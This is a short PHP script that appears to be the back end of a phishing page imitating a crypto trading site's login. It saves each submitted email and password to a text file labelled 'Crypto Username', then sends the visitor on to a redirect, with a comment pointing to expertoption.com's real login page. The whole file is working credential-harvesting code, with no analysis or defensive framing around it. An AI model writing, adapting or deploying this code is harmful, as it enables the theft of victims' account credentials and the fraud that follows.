<?php
file_put_contents("usernames.txt", "Crypto Username: " . $_POST["email"] . "\nPassword: " . $_POST["password"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://expertoption.com/login
header("Location: $url");
exit();
?>